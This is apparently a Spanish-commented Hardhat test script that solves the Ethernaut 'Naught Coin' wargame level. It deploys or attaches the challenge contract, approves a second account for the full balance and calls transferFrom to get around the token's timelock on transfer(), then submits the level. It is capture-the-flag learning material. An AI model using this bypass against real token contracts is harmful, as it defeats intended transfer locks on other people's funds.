import { expect } from "chai";
import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { createChallenge, submitLevel } from "./utils";
import { Interface } from "ethers/lib/utils";

let accounts: Signer[];
let eoa: Signer;
let eoa2: Signer;
let attacker: Contract;
let challenge: Contract;
let cuenta2Challenge: Contract;
const LEVEL_ADDRESS = "0x096bb5e93a204BfD701502EB6EF266a950217218";
const INSTANCIA_DEL_NIVEL: string = "";

before(async () => {
  accounts = await ethers.getSigners();
  [eoa,eoa2] = accounts;
  //Contrato del challenge
  const challengeFactory = await ethers.getContractFactory(`NaughtCoin`);
  if (INSTANCIA_DEL_NIVEL.length > 1) {
    challenge = challengeFactory.attach(INSTANCIA_DEL_NIVEL);
    cuenta2Challenge = challenge.connect(eoa2);
    console.log(`INSTANCIA CONTRATO CHALLENGE UTILIZADA DESDE:`, challenge.address);
  }
  else {
    const challengeAddress = await createChallenge(LEVEL_ADDRESS);
    challenge = challengeFactory.attach(challengeAddress);
    cuenta2Challenge = challenge.connect(eoa2);
    console.log(`CONTRATO CHALLENGE DEPLOYADO EN:`, challenge.address);
  }

  //Contrato atacante (Si fuera necesario)
  // const attackerFactory = await ethers.getContractFactory(`Attacker`);
  // attacker = await attackerFactory.deploy(challenge.address);
  // await attacker.deployed();
  // console.log(`CONTRATO ATACANTE DEPLOYADO EN:`, attacker.address);
});

describe("Naught Coin Challenge", async()=> {
  it("Resuelve el challenge - Naught Coin", async()=>{
    const cuenta1Address = await eoa.getAddress();
    const cuenta2Address = await eoa2.getAddress();

    const miSupply:BigNumber = BigNumber.from(await challenge.balanceOf(cuenta1Address));
    console.log(`MI BALANCE ES: ${miSupply}`);    
    //Primero invocamos la función approve para aprobar que la cuenta2 pueda utilizar nuestros fondos
    let txApprove = await challenge.approve(cuenta2Address, miSupply);
    await txApprove.wait();
    let txTransferFrom = await cuenta2Challenge.transferFrom(cuenta1Address,cuenta2Address,miSupply);
    await txTransferFrom.wait();

    const cuenta2Supply = await challenge.balanceOf(cuenta2Address);
    console.log(`EL BALANCE DE LA CUENTA 2 AHORA ES: ${cuenta2Supply}`);
    
  });
});

after(async () => {
  expect(await submitLevel(challenge.address), "DESAFÍO INCOMPLETO").to.be.true;
});


//Tener en cuenta que este script funcionará correctamente de forma local, pero al querer transladarlo a la red Rinkeby, será necesario enviar algunos ether la cuenta 2, para que pueda pagar el gas necesario de la transacción con el "transferFrom". De no hacerlo, aparecerá un error similar al de la imagen anexada en la carpeta de este challenge.
